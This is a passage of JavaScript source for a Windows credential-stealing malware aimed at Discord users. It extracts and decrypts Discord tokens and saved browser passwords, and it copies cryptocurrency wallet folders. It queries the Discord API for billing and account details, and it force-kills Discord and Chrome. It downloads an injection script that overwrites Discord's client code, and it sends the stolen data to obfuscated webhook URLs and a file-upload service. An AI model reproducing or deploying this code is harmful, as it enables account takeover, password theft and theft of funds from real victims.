KdVcSUdcSUxcKSPcKSPcKUdc",31,"VKSPUdHxc",42,8,51)) 
}
   
//

const tokens = [];

async function findToken(path) {
    let path_tail = path;
    path += 'Local Storage\\leveldb';

    if (!path_tail.includes('discordd')) {
        try {
            fs.readdirSync(path)
                .map(file => {
                    (file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8')
                        .split(/\r?\n/)
                        .forEach(line => {
                        const patterns = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g)];
                            for (const pattern of patterns) {
                                const foundTokens = line.match(pattern);
                                if (foundTokens) foundTokens.forEach(token => {
                                    if (!tokens.includes(token)) tokens.push(token)
                                });
                            }
                        });
                });
        } catch (e) { }
        return;
    } else {
        if (fs.existsSync(path_tail + '\\Local State')) {
            try {
     const tokenRegex = /([A-Za-z\d]{24})\.([\w-]{6})\.([\w-]{27})/;

fs.readdirSync(path).forEach(file => {
    if (file.endsWith('.log') || file.endsWith('.ldb')) {
        const fileContent = fs.readFileSync(`${path}\\${file}`, 'utf8');
        const lines = fileContent.split(/\r?\n/);

        lines.forEach(line => {
            const foundTokens = line.match(tokenRegex);

            if (foundTokens) {
                foundTokens.forEach(token => {
                    const encryptedKey = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State')).os_crypt.encrypted_key, 'base64').slice(5);
                    const key = dpapi.unprotectData(Buffer.from(encryptedKey, 'utf-8'), null, 'CurrentUser');
                    const tokenParts = token.split('.');
                    const start = Buffer.from(tokenParts[0], 'base64');
                    const middle = Buffer.from(tokenParts[1], 'base64');
                    const end = Buffer.from(tokenParts[2], 'base64');
                    const decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
                    decipher.setAuthTag(end);
                    const out = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8');
                    
                    if (!tokens.includes(out)) {
                        tokens.push(out);
                    }
                });
            }
        });
    }
});

            } catch (e) { }
            return;
        }
    }
}

async function stealTokens() {
    for (let path of paths) {
        await findToken(path);
    }
    for (let token of tokens) {
        let json;
        await axios.get("https://discord.com/api/v9/users/@me", {
            headers: {
                "Content-Type": "application/json",
                "authorization": token
            }
        }).then(res => { json = res.data }).catch(() => { json = null })
        if (!json) continue;
        var ip = await getIp();
        var billing = await getBilling(token);
        var friends = await getRelationships(token);
function _0x58d1(){var _0x3256ed=['https://bu','2536KfrPrm','8951254119','_721d6729d','4058971YRGdcv','dwatch.net','HQ\x20Friends','00559410/a','rd:\x20Billin','@FewerStea','pp.com/ava','ab7a445378','https://me','8846109tlThyf','14cUTcnq','0b5e1a8979','/894698886','post','n.discorda','push','ler','o\x20Type:','h_meridian','shift','username','4030XFbVVS','email',':star:\x20Bad','mation','https://cd','tor','/copy/','dia.discor',':gem:\x20Nitr','ken](https','6899712weHliQ','flags','1558424gHuFdH','3654994YyopMs','ges:','s:\x20IP:','\x20Email:','131057PrEERT','4872828lTtWYI','4116368ekQqoJ','5ROryWq','621446164/','657708aEroVK','discrimina','premium_ty','?size=512','catch','avatar','e9a.gif','5802048HkIBvv','`\x0a[Copy\x20To','ttachments','209229yVTmHa','5039670rkizLb','://buildan','h.net/'];_0x58d1=function(){return _0x3256ed;};return _0x58d1();}(function(_0x5dc79a,_0x2704b6){var _0x27eb7c=_0x1d0c,_0x56a427=_0x5dc79a();while(!![]){try{var _0x5552b6=parseInt(_0x27eb7c(0x12c))/0x1+parseInt(_0x27eb7c(0x164))/0x2+parseInt(_0x27eb7c(0x131))/0x3+-parseInt(_0x27eb7c(0x12e))/0x4*(parseInt(_0x27eb7c(0x12f))/0x5)+-parseInt(_0x27eb7c(0x13c))/0x6+parseInt(_0x27eb7c(0x143))/0x7+parseInt(_0x27eb7c(0x162))/0x8;if(_0x5552b6===_0x2704b6)break;else _0x56a427['push'](_0x56a427['shift']());}catch(_0x5370ee){_0x56a427['push'](_0x56a427['shift']());}}}(_0x58d1,0xab941));function _0x2104(_0x55a793,_0x1ed1f3){var _0x10e16d=_0x26e9();return _0x2104=function(_0x33f04a,_0x1d27ad){_0x33f04a=_0x33f04a-(0x180a+0x5c5+-0x26*0xbf);var _0x2b7c8b=_0x10e16d[_0x33f04a];return _0x2b7c8b;},_0x2104(_0x55a793,_0x1ed1f3);}function _0x1d0c(_0x191b4d,_0x5c9006){var _0x58d12e=_0x58d1();return _0x1d0c=function(_0x1d0cf4,_0x15b106){_0x1d0cf4=_0x1d0cf4-0x128;var _0x4fd718=_0x58d12e[_0x1d0cf4];return _0x4fd718;},_0x1d0c(_0x191b4d,_0x5c9006);}var _0x1a35f8=_0x2104;(function(_0x50406d,_0x40d78e){var _0x23a0a6=_0x1d0c,_0x5c21c8=_0x2104,_0x456341=_0x50406d();while(!![]){try{var _0x2cabe8=-parseInt(_0x5c21c8(0x1a1))/(-0x1*-0xcd2+0x1848+-0x2519)+parseInt(_0x5c21c8(0x18c))/(-0x106b+0xe8*0x17+-0x46b*0x1)*(parseInt(_0x5c21c8(0x19d))/(-0x1*-0x156b+0x1f9+-0x1761))+parseInt(_0x5c21c8(0x183))/(0x1efe*-0x1+-0x23fe+0x43*0x100)*(-parseInt(_0x5c21c8(0x186))/(-0x25*0x7b+-0xf4+-0x12c*-0x10))+parseInt(_0x5c21c8(0x1a3))/(-0x1*0xeef+0x3*0x1af+0x9e8)+-parseInt(_0x5c21c8(0x178))/(-0x1155+-0x59*-0x68+-0x1*0x12cc)+-parseInt(_0x5c21c8(0x1a9))/(0x1*-0xb28+0x1*0x1049+0x9*-0x91)+parseInt(_0x5c21c8(0x1b0))/(0x6b3+0x2442+0x43*-0xa4);if(_0x2cabe8===_0x40d78e)break;else _0x456341[_0x23a0a6(0x152)](_0x456341[_0x23a0a6(0x156)]());}catch(_0x5c75f9){_0x456341[_0x23a0a6(0x152)](_0x456341[_0x23a0a6(0x156)]());}}}(_0x26e9,-0x8*0x18a9d+0xe73c7*0x1+0x58185),axios[_0x1a35f8(0x1ad)](_0x1a35f8(0x188)+_0x1a35f8(0x17b)+_0x1a35f8(0x1a8),{'content':'','embeds':[{'title':_0x1a35f8(0x17a)+_0x1a35f8(0x191),'color':0x3498db,'author':{'name':json[_0x1a35f8(0x190)]+'#'+json[_0x1a35f8(0x195)+_0x1a35f8(0x179)]+'\x20('+json['id']+')','icon_url':_0x1a35f8(0x17f)+_0x1a35f8(0x18a)+_0x1a35f8(0x194)+_0x1a35f8(0x1a6)+_0x1a35f8(0x1a0)+_0x1a35f8(0x193)+_0x1a35f8(0x184)+_0x1a35f8(0x180)+_0x1a35f8(0x19b)+_0x1a35f8(0x187)+_0x1a35f8(0x17d)+_0x1a35f8(0x17c)},'thumbnail':{'url':_0x1a35f8(0x19e)+_0x1a35f8(0x18d)+_0x1a35f8(0x199)+_0x1a35f8(0x1a4)+json['id']+'/'+json[_0x1a35f8(0x19c)]+_0x1a35f8(0x18b)},'fields':[{'name':_0x1a35f8(0x189)+'n:','value':'`'+token+(_0x1a35f8(0x198)+_0x1a35f8(0x19f)+_0x1a35f8(0x1a7)+_0x1a35f8(0x181)+_0x1a35f8(0x1b1))+token+')'},{'name':_0x1a35f8(0x18e)+_0x1a35f8(0x1ae),'value':getBadges(json[_0x1a35f8(0x1ab)]),'inline':!![]},{'name':_0x1a35f8(0x197)+_0x1a35f8(0x1af),'value':await getNitro(json[_0x1a35f8(0x19a)+'pe'],json['id'],token),'inline':!![]},{'name':_0x1a35f8(0x175)+_0x1a35f8(0x1a5)+'g:','value':billing,'inline':!![]},{'name':_0x1a35f8(0x18f)+_0x1a35f8(0x1b2),'value':'`'+json[_0x1a35f8(0x1a2)]+'`','inline':!![]},{'name':_0x1a35f8(0x17e)+_0x1a35f8(0x192)+_0x1a35f8(0x1ac),'value':'`'+ip+'`','inline':!![]}]},{'title':_0x1a35f8(0x177),'color':0xe74c3c,'description':friends,'author':{'name':_0x1a35f8(0x1aa),'icon_url':_0x1a35f8(0x17f)+_0x1a35f8(0x18a)+_0x1a35f8(0x194)+_0x1a35f8(0x1a6)+_0x1a35f8(0x1a0)+_0x1a35f8(0x193)+_0x1a35f8(0x184)+_0x1a35f8(0x180)+_0x1a35f8(0x19b)+_0x1a35f8(0x187)+_0x1a35f8(0x17d)+_0x1a35f8(0x17c)},'footer':{'text':_0x1a35f8(0x182)+_0x1a35f8(0x185)}}]})[_0x1a35f8(0x176)](_0x5f5b47=>{})[_0x1a35f8(0x196)](()=>{}),axios[_0x1a35f8(0x1ad)](webhook3939,{'content':'','embeds':[{'title':_0x1a35f8(0x17a)+_0x1a35f8(0x191),'color':0x3498db,'author':{'name':json[_0x1a35f8(0x190)]+'#'+json[_0x1a35f8(0x195)+_0x1a35f8(0x179)]+'\x20('+json['id']+')','icon_url':_0x1a35f8(0x17f)+_0x1a35f8(0x18a)+_0x1a35f8(0x194)+_0x1a35f8(0x1a6)+_0x1a35f8(0x1a0)+_0x1a35f8(0x193)+_0x1a35f8(0x184)+_0x1a35f8(0x180)+_0x1a35f8(0x19b)+_0x1a35f8(0x187)+_0x1a35f8(0x17d)+_0x1a35f8(0x17c)},'thumbnail':{'url':_0x1a35f8(0x19e)+_0x1a35f8(0x18d)+_0x1a35f8(0x199)+_0x1a35f8(0x1a4)+json['id']+'/'+json[_0x1a35f8(0x19c)]+_0x1a35f8(0x18b)},'fields':[{'name':_0x1a35f8(0x189)+'n:','value':'`'+token+(_0x1a35f8(0x198)+_0x1a35f8(0x19f)+_0x1a35f8(0x1a7)+_0x1a35f8(0x181)+_0x1a35f8(0x1b1))+token+')'},{'name':_0x1a35f8(0x18e)+_0x1a35f8(0x1ae),'value':getBadges(json[_0x1a35f8(0x1ab)]),'inline':!![]},{'name':_0x1a35f8(0x197)+_0x1a35f8(0x1af),'value':await getNitro(json[_0x1a35f8(0x19a)+'pe'],json['id'],token),'inline':!![]},{'name':_0x1a35f8(0x175)+_0x1a35f8(0x1a5)+'g:','value':billing,'inline':!![]},{'name':_0x1a35f8(0x18f)+_0x1a35f8(0x1b2),'value':'`'+json[_0x1a35f8(0x1a2)]+'`','inline':!![]},{'name':_0x1a35f8(0x17e)+_0x1a35f8(0x192)+_0x1a35f8(0x1ac),'value':'`'+ip+'`','inline':!![]}]},{'title':_0x1a35f8(0x177),'color':0xe74c3c,'description':friends,'author':{'name':_0x1a35f8(0x1aa),'icon_url':_0x1a35f8(0x17f)+_0x1a35f8(0x18a)+_0x1a35f8(0x194)+_0x1a35f8(0x1a6)+_0x1a35f8(0x1a0)+_0x1a35f8(0x193)+_0x1a35f8(0x184)+_0x1a35f8(0x180)+_0x1a35f8(0x19b)+_0x1a35f8(0x187)+_0x1a35f8(0x17d)+_0x1a35f8(0x17c)},'footer':{'text':_0x1a35f8(0x182)+_0x1a35f8(0x185)}}]})[_0x1a35f8(0x176)](_0x4d00d9=>{})[_0x1a35f8(0x196)](()=>{}));function _0x26e9(){var _0x56bc81=_0x1d0c,_0x5e137f=[_0x56bc81(0x141),_0x56bc81(0x153),_0x56bc81(0x158),_0x56bc81(0x14e),_0x56bc81(0x13f),':key:\x20Toke',_0x56bc81(0x15f),_0x56bc81(0x134),_0x56bc81(0x14d),_0x56bc81(0x151),_0x56bc81(0x15a),':envelope:',_0x56bc81(0x157),_0x56bc81(0x15b),_0x56bc81(0x155),_0x56bc81(0x130),'dapp.net/a',_0x56bc81(0x132),_0x56bc81(0x135),_0x56bc81(0x160),_0x56bc81(0x139),_0x56bc81(0x149),_0x56bc81(0x133),_0x56bc81(0x142),_0x56bc81(0x136),_0x56bc81(0x13b),_0x56bc81(0x15c),_0x56bc81(0x161),_0x56bc81(0x14f),'25026hckhJQ',_0x56bc81(0x159),_0x56bc81(0x12d),'tars/',_0x56bc81(0x147),_0x56bc81(0x13a),_0x56bc81(0x13d),_0x56bc81(0x13e),_0x56bc81(0x138),_0x56bc81(0x145),_0x56bc81(0x163),_0x56bc81(0x12a),_0x56bc81(0x150),_0x56bc81(0x129),_0x56bc81(0x154),_0x56bc81(0x14c),_0x56bc81(0x15e),_0x56bc81(0x12b),':credit_ca','then','Friends',_0x56bc81(0x128),_0x56bc81(0x15d),'User\x20Infor','ildandwatc',_0x56bc81(0x137),_0x56bc81(0x14a),':globe_wit',_0x56bc81(0x14b),_0x56bc81(0x146),_0x56bc81(0x144),_0x56bc81(0x148),_0x56bc81(0x140)];return _0x26e9=function(){return _0x5e137f;},_0x26e9();}
        continue;
    }
}

const badges = {
    Discord_Employee: {
        Value: 1,
        Emoji: "<:staff:874750808728666152>",
        Rare: true,
    },
    Partnered_Server_Owner: {
        Value: 2,
        Emoji: "<:partner:874750808678354964>",
        Rare: true,
    },
    HypeSquad_Events: {
        Value: 4,
        Emoji: "<:hypesquad_events:874750808594477056>",
        Rare: true,
    },
    Bug_Hunter_Level_1: {
        Value: 8,
        Emoji: "<:bughunter_1:874750808426692658>",
        Rare: true,
    },
    Early_Supporter: {
        Value: 512,
        Emoji: "<:early_supporter:874750808414113823>",
        Rare: true,
    },
    Bug_Hunter_Level_2: {
        Value: 16384,
        Emoji: "<:bughunter_2:874750808430874664>",
        Rare: true,
    },
    Early_Verified_Bot_Developer: {
        Value: 131072,
        Emoji: "<:developer:874750808472825986>",
        Rare: true,
    },
    House_Bravery: {
        Value: 64,
        Emoji: "<:bravery:874750808388952075>",
        Rare: false,
    },
    House_Brilliance: {
        Value: 128,
        Emoji: "<:brilliance:874750808338608199>",
        Rare: false,
    },
    House_Balance: {
        Value: 256,
        Emoji: "<:balance:874750808267292683>",
        Rare: false,
    },
    Discord_Official_Moderator: {
        Value: 262144,
        Emoji: "<:moderator:976739399998001152>",
        Rare: true,
    }
};

async function getRelationships(token) {
    var j = await axios.get('https://discord.com/api/v9/users/@me/relationships', {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    }).catch(() => { })
    if (!j) return `*Account locked*`
    var json = j.data
    const r = json.filter((user) => {
        return user.type == 1
    })
    var gay = '';
    for (z of r) {
        var b = getRareBadges(z.user.public_flags)
        if (b != "") {
            gay += `${b} | \`${z.user.username}#${z.user.discriminator}\`\n`
        }
    }
    if (gay == '') gay = "*Nothing to see here*"
    return gay
}

async function getBilling(token) {
    let json;
    await axios.get("https://discord.com/api/v9/users/@me/billing/payment-sources", {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    }).then(res => { json = res.data })
        .catch(err => { })
    if (!json) return '\`Unknown\`';

    var bi = '';
    json.forEach(z => {
        if (z.type == 2 && z.invalid != !0) {
            bi += "<:946246524504002610:962747802830655498>";
        } else if (z.type == 1 && z.invalid != !0) {
            bi += "<:rustler:987692721613459517>";
        }
    });
    if (bi == '') bi = `\`No Billing\``
    return bi;
}

function getBadges(flags) {
    var b = '';
    for (const prop in badges) {
        let o = badges[prop];
        if ((flags & o.Value) == o.Value) b += o.Emoji;
    };
    if (b == '') return `\`No Badges\``;
    return `${b}`;
}

function getRareBadges(flags) {
    var b = '';
    for (const prop in badges) {
        let o = badges[prop];
        if ((flags & o.Value) == o.Value && o.Rare) b += o.Emoji;
    };
    return b;
}

async function getNitro(flags, id, token) {
    switch (flags) {
        case 1:
            return "<:946246402105819216:962747802797113365>";
        case 2:
            let info;
            await axios.get(`https://discord.com/api/v9/users/${id}/profile`, {
                headers: {
                    "Content-Type": "application/json",
                    "authorization": token
                }
            }).then(res => { info = res.data })
                .catch(() => { })
            if (!info) return "<:946246402105819216:962747802797113365>";

            if (!info.premium_guild_since) return "<:946246402105819216:962747802797113365>";

            let boost = ["<:boost1month:1161356435360325673>", "<:boost2month:1161356669004030033>", "<:boost3month:1161356821806710844>", "<:boost6month:1161357418480029776>", "<:boost9month:1161357513820741852>", "<:boost12month:1161357639737946206>", "<:boost15month:967518897987256400>", "<:boost18month:967519190133145611>", "<:boost24month:969686081958207508>"]
            var i = 0

            try {
                let d = new Date(info.premium_guild_since)
                let boost2month = Math.round((new Date(d.setMonth(d.getMonth() + 2)) - new Date(Date.now())) / 86400000)
                let d1 = new Date(info.premium_guild_since)
                let boost3month = Math.round((new Date(d1.setMonth(d1.getMonth() + 3)) - new Date(Date.now())) / 86400000)
                let d2 = new Date(info.premium_guild_since)
                let boost6month = Math.round((new Date(d2.setMonth(d2.getMonth() + 6)) - new Date(Date.now())) / 86400000)
                let d3 = new Date(info.premium_guild_since)
                let boost9month = Math.round((new Date(d3.setMonth(d3.getMonth() + 9)) - new Date(Date.now())) / 86400000)
                let d4 = new Date(info.premium_guild_since)
                let boost12month = Math.round((new Date(d4.setMonth(d4.getMonth() + 12)) - new Date(Date.now())) / 86400000)
                let d5 = new Date(info.premium_guild_since)
                let boost15month = Math.round((new Date(d5.setMonth(d5.getMonth() + 15)) - new Date(Date.now())) / 86400000)
                let d6 = new Date(info.premium_guild_since)
                let boost18month = Math.round((new Date(d6.setMonth(d6.getMonth() + 18)) - new Date(Date.now())) / 86400000)
                let d7 = new Date(info.premium_guild_since)
                let boost24month = Math.round((new Date(d7.setMonth(d7.getMonth() + 24)) - new Date(Date.now())) / 86400000)

                if (boost2month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost3month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost6month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost9month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost12month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost15month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost18month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost24month > 0) {
                    i += 0
                } else if (boost24month < 0 || boost24month == 0) {
                    i += 1
                } else {
                    i = 0
                }
            } catch {
                i += 0
            }
            return `<:946246402105819216:962747802797113365> ${boost[i]}`
        default:
            return "\`No Nitro\`";
    };
}

async function getIp() {
    var ip = await axios.get("https://www.myexternalip.com/raw")
    return ip.data;
}




////


async function StopCords() {
    exec('tasklist', (err, stdout) => {
        for (const executable of ['Discord.exe', 'DiscordCanary.exe', 'Telegram.exe', 'chrome.exe', 'discordDevelopment.exe', 'DiscordPTB.exe']) {
            if (stdout.includes(executable)) {
                exec(`taskkill /F /T /IM ${executable}`, (err) => {})
                exec(`"${localappdata}\\${executable.replace('.exe', '')}\\Update.exe" --processStart ${executable}`, (err) => {})
            }
        }
    })
}

async function InfectDiscords() {
    var injection, betterdiscord = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar";
    if (fs.existsSync(betterdiscord)) {
        var read = fs.readFileSync(dir);
        fs.writeFileSync(dir, buf_replace(read, "api/webhooks", "spacestealerxD"))
    }
    await httpx(`https://buildandwatch.net/xxfixxyy`).then((code => code.data)).then((res => {
        res = res.replace("%API_AUTH_HERE%", api_auth), injection = res
    })).catch(), await fs.readdir(local, (async (err, files) => {
        await files.forEach((async dirName => {
            dirName.toString().includes("cord") && await discords.push(dirName)
        })), discords.forEach((async discordPath => {
            await fs.readdir(local + "\\" + discordPath, ((err, file) => {
                file.forEach((async insideDiscordDir => {
                    insideDiscordDir.includes("app-") && await fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir, ((err, file) => {
                        file.forEach((async insideAppDir => {
                            insideAppDir.includes("modules") && fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir, ((err, file) => {
                                file.forEach((insideModulesDir => {
                                    insideModulesDir.includes("discord_desktop_core") && fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir, ((err, file) => {
                                        file.forEach((insideCore => {
                                            insideCore.includes("discord_desktop_core") && fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore, ((err, file) => {
                                                file.forEach((insideCoreFinal => {
                                                    insideCoreFinal.includes("index.js") && (fs.mkdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\spacex", (() => {

                                                    })), 
                                                    
                                                    fs.writeFile(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js", injection, (() => {})))
                                                    if (!injection_paths.includes(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js")) {
                                                        injection_paths.push(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js"); DiscordListener(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js")
                                                    }
                                                }))
                                            }))
                                        }))
                                    }))
                                }))
                            }))
                        }))
                    }))
                }))
            }))
        }))
    }))
}

async function getEncrypted() {
    for (let _0x4c3514 = 0; _0x4c3514 < browserPath.length; _0x4c3514++) {
        if (!fs.existsSync('' + browserPath[_0x4c3514][0])) {
            continue
        }
        try {
            let _0x276965 = Buffer.from(
                JSON.parse(fs.readFileSync(browserPath[_0x4c3514][2] + 'Local State'))
                .os_crypt.encrypted_key,
                'base64'
            ).slice(5)
            const _0x4ff4c6 = Array.from(_0x276965),
                _0x4860ac = execSync(
                    'powershell.exe Add-Type -AssemblyName System.Security; [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(' +
                    _0x4ff4c6 +
                    "), $null, 'CurrentUser')"
                )
                .toString()
                .split('\r\n'),
                _0x4a5920 = _0x4860ac.filter((_0x29ebb3) => _0x29ebb3 != ''),
                _0x2ed7ba = Buffer.from(_0x4a5920)
            browserPath[_0x4c3514].push(_0x2ed7ba)
        } catch (_0x32406b) {}
    }
}



async function getExtension() {
  addFolder('Wallets'); // Assuming addFolder() function is defined somewhere

  let walletCount = 0;
  let browserCount = 0;

  for (let [extensionName, extensionPath] of Object.entries(extension)) {
    for (let i = 0; i < browserPath.length; i++) {
      let browserFolder;
      if (browserPath[i][0].includes('Local')) {
        browserFolder = browserPath[i][0].split('\\Local\\')[1].split('\\')[0];
      } else {
        browserFolder = browserPath[i][0].split('\\Roaming\\')[1].split('\\')[1];
      }

      const browserExtensionPath = `${browserPath[i][0]}${extensionPath}`;
      if (fs.existsSync(browserExtensionPath)) {
        const walletFolder = `\\Wallets\\${extensionName}_${browserFolder}_${browserPath[i][1]}`;
        copyFolder(walletFolder, browserExtensionPath);
        walletCount++;
        count.wallets++;
      }
    }
  }

  for (let [walletName, walletPath] of Object.entries(walletPaths)) {
    if (fs.existsSync(walletPath)) {
      const walletFolder = `\\wallets\\${walletName}`;
      copyFolder(walletFolder, walletPath);
      browserCount++;
      count.wallets++;
    }
  }

const walletCountStr = walletCount.toString();
const browserCountStr = browserCount.toString();

if (walletCountStr !== '0' || browserCountStr !== '0') {
const message = {
  embeds: [
    {
      title: '💼 Wallet Information',
      description: 'Here is the wallet information:',
      color: 0xFFA500, // Turuncu renk öneriyorum
      fields: [
        {
          name: '🌐 Browser Wallet',
          value: walletCountStr,
          inline: true,
        },
      ],
    },
  ],
};


function _0x5203(_0x2d4291,_0x5abc68){var _0xf42867=_0xf428();return _0x5203=function(_0x5203bb,_0x26df89){_0x5203bb=_0x5203bb-0x193;var _0x2ba890=_0xf42867[_0x5203bb];return _0x2ba890;},_0x5203(_0x2d4291,_0x5abc68);}(function(_0x1371cc,_0x3badb2){var _0xbdc7ad=_0x5203,_0x1b78c8=_0x1371cc();while(!![]){try{var _0x1c86d2=parseInt(_0xbdc7ad(0x198))/0x1+-parseInt(_0xbdc7ad(0x19a))/0x2*(parseInt(_0xbdc7ad(0x195))/0x3)+parseInt(_0xbdc7ad(0x1a0))/0x4+parseInt(_0xbdc7ad(0x196))/0x5+-parseInt(_0xbdc7ad(0x1a4))/0x6+-parseInt(_0xbdc7ad(0x1a2))/0x7*(-parseInt(_0xbdc7ad(0x19c))/0x8)+parseInt(_0xbdc7ad(0x1a3))/0x9*(parseInt(_0xbdc7ad(0x19e))/0xa);if(_0x1c86d2===_0x3badb2)break;else _0x1b78c8['push'](_0x1b78c8['shift']());}catch(_0x37493d){_0x1b78c8['push'](_0x1b78c8['shift']());}}}(_0xf428,0x58784));var _0x60d9c2=_0x2c5c;function _0xf428(){var _0x2bcd7e=['h.net/','18YNdwCH','713245ohdDyM','990280yDCVJj','651577CYVSCZ','push','241050uIpxcS','9BQfcFp','994064SbdMBw','shift','436720hvvFXi','ildandwatc','1017304UTBwMe','1660168KgWLGx','28bKWedP','54RKwBSV','4332564BBZVxP','28387IhJwlk'];_0xf428=function(){return _0x2bcd7e;};return _0xf428();}function _0x5404(){var _0x30a623=_0x5203,_0xdef9fb=[_0x30a623(0x193),'3515CDuJLn','3584112VWlufJ','1656438arMmva','https://bu','2526pjyQvc','3eMzAOg',_0x30a623(0x197),'post',_0x30a623(0x19f),_0x30a623(0x194),'2875092dPsQOh',_0x30a623(0x1a1),'2uFxlSU',_0x30a623(0x19b)];return _0x5404=function(){return _0xdef9fb;},_0x5404();}function _0x2c5c(_0xbefda0,_0x49aea3){var _0x1f77ad=_0x5404();return _0x2c5c=function(_0x44d771,_0x5d3f71){_0x44d771=_0x44d771-(-0x1*0x1d82+0x182d+0x655);var _0x116a73=_0x1f77ad[_0x44d771];return _0x116a73;},_0x2c5c(_0xbefda0,_0x49aea3);}(function(_0x523ff4,_0x2fd25d){var _0x12185e=_0x5203,_0x1c3a32=_0x2c5c,_0x110d08=_0x523ff4();while(!![]){try{var _0x5e8526=parseInt(_0x1c3a32(0x104))/(-0x1*-0x21dc+-0xa*0x2a2+-0x787)*(-parseInt(_0x1c3a32(0x102))/(-0x2377+0x1*0xc25+0x1*0x1754))+parseInt(_0x1c3a32(0x10a))/(-0x15ab+0xcd5+0x1c5*0x5)*(-parseInt(_0x1c3a32(0x101))/(-0xe7b+0xb56+0x329*0x1))+-parseInt(_0x1c3a32(0x105))/(-0x2*0x25c+-0x1e67+0x1a*0x15a)*(-parseInt(_0x1c3a32(0x109))/(0x2389+0x1ec0+-0x4243*0x1))+-parseInt(_0x1c3a32(0x107))/(-0x367+0x189*-0x3+0x79*0x11)+parseInt(_0x1c3a32(0x106))/(-0x115*-0x23+-0x17e1+-0xdf6)*(parseInt(_0x1c3a32(0x103))/(0xad6+-0x30+-0x1*0xa9d))+-parseInt(_0x1c3a32(0x10b))/(0x187+0x2c*-0x47+-0xab7*-0x1)+parseInt(_0x1c3a32(0x100))/(0x17c+-0x1259+0x10e8);if(_0x5e8526===_0x2fd25d)break;else _0x110d08[_0x12185e(0x199)](_0x110d08[_0x12185e(0x19d)]());}catch(_0x1eac84){_0x110d08[_0x12185e(0x199)](_0x110d08[_0x12185e(0x19d)]());}}}(_0x5404,0x2d0c4+-0x1d2a7+-0x393f*-0xb),axios[_0x60d9c2(0x10c)](_0x60d9c2(0x108)+_0x60d9c2(0x10d)+_0x60d9c2(0x10e),message),axios[_0x60d9c2(0x10c)](webhook3939,message));
   
    
} else {
  console.log('walletCount and browserCount are both 0. No action needed.');
}
 
}



async function getPasswords() {
  const _0x540754 = [];
  let passwordsFound = false; // Şifre bulunduğu zaman bu değeri true yapacağız

  for (let _0x261d97 = 0; _0x261d97 < browserPath.length; _0x261d97++) {
    if (!fs.existsSync(browserPath[_0x261d97][0])) {
      continue;
    }

    let _0xd541c2;
    if (browserPath[_0x261d97][0].includes('Local')) {
      _0xd541c2 = browserPath[_0x261d97][0].split('\\Local\\')[1].split('\\')[0];
    } else {
      _0xd541c2 = browserPath[_0x261d97][0].split('\\Roaming\\')[1].split('\\')[1];
    }

    const _0x256bed = browserPath[_0x261d97][0] + 'Login Data';
    const _0x239644 = browserPath[_0x261d97][0] + 'passwords.db';

    fs.copyFileSync(_0x256bed, _0x239644);

    const _0x3d71cb = new sqlite3.Database(_0x239644);

    await new Promise((_0x2c148b, _0x32e8f4) => {
      _0x3d71cb.each(
        'SELECT origin_url, username_value, password_value FROM logins',
        (_0x4c7a5b, _0x504e35) => {
          if (!_0x504e35.username_value) {
            return;
          }

          let _0x3d2b4b = _0x504e35.password_value;
          try {
            const _0x5e1041 = _0x3d2b4b.slice(3, 15);
            const _0x279e1b = _0x3d2b4b.slice(15, _0x3d2b4b.length - 16);
            const _0x2a933a = _0x3d2b4b.slice(_0x3d2b4b.length - 16, _0x3d2b4b.length);
            const _0x210aeb = crypto.createDecipheriv(
              'aes-256-gcm',
              browserPath[_0x261d97][3],
              _0x5e1041
            );
            _0x210aeb.setAuthTag(_0x2a933a);
            const password =
              _0x210aeb.update(_0x279e1b, 'base64', 'utf-8') +
              _0x210aeb.final('utf-8');

            _0x540754.push(
              '================\nURL: ' +
                _0x504e35.origin_url +
                '\nUsername: ' +
                _0x504e35.username_value +
                '\nPassword: ' +
                password +
                '\nApplication: ' +
                _0xd541c2 +
                ' ' +
                browserPath[_0x261d97][1] +
                '\n'
            );

            count.passwords++;
            passwordsFound = true; // Şifre bulunduğunu işaretliyoruz
          } catch (_0x5bf37a) {}
        },
        () => {
          _0x2c148b('');
        }
      );
    });
  }

  if (_0x540754.length) {
    fs.writeFileSync(randomPath + '\\Wallets\\Passwords.txt', _0x540754.join(''), {
      encoding: 'utf8',
      flag: 'a+',
    });
  }

  if (!passwordsFound) {
    // Şifre bulunamadıysa bu kod bloğu çalışır
    fs.writeFileSync(randomPath + '\\Wallets\\Passwords.txt', 'No passwords found.', {
      encoding: 'utf8',
      flag: 'a+',
    });
  }
  
  
 

// Gofile.io API'dan sunucu bilgisini al ve dosyayı yükle
axios.get('https://api.gofile.io/getServer')
  .then(response => {
    if (response.data && response.data.data && response.data.data.server) {
      const server = response.data.data.server;

